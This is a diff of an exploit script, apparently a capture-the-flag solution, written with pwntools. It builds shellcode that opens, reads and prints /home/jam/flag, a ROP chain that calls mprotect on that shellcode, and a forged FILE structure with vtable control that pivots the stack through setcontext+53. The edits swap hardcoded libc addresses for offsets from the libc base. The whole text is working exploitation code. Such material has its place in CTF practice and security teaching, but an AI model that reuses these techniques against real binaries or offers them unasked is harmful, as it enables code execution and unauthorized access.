@@ -51,13 +51,7 @@ shellcode += 'sub rsp, 0x108'
 shellcode += shellcraft.open("/home/jam/flag")
 shellcode += shellcraft.read("rax",'rsp',100)
 shellcode += shellcraft.write(1,'rsp',100)
-'''
-shellcode += 'sub rsp, 0x300'
-shellcode += shellcraft.pushstr("/home/jam/flag\x00")
-shellcode += shellcraft.open('rsp', 0, 0)
-shellcode += shellcraft.read('rax', 'rsp', 100)
-shellcode += shellcraft.write(1, 'rsp', 100)
-'''
+
 
 # ROPgadget
 setcontext_53 = libc_base + 293765
@@ -82,22 +76,22 @@ rop += p64(pop_rax)
 rop += p64(10)                  # sys_mprotect
 rop += p64(syscall)
 rop += 'X'*8					# dummy
-rop += p64(0x7ffff7dd1ae0)  	# shellcode addr
+rop += p64(libc_base+3951328)  	# shellcode addr
 rop += p64(0)
 rop += asm(shellcode)
 
 # RSP control
 pay = ''
 pay += '\x00'*5                 # fake setting
-pay += p64(0x00007ffff7dd3790)
+pay += p64(libc_base+3958672)
 pay += p64(0xffffffffffffffff)
 pay += p64(0)
-pay += p64(0x7ffff7dd1a80)		# mov rsp, [rdi + 0xa0]
+pay += p64(libc_base+3951232)	# mov rsp, [rdi + 0xa0] -> rsp control
 pay += p64(ret)					# mov rcx, [rdi + 0xa8] -> push rcx control
 pay += p64(0)*2
 pay += p64(0xffffffff)
 pay += p64(0)*2
-pay += p64(0x7ffff7dd19c0)
+pay += p64(libc_base+3951040)	# vtable control -> setcontext+53 dummy
 pay += p64(0)*2+p64(setcontext_53)*20
 pay += p64(0)
 pay += rop
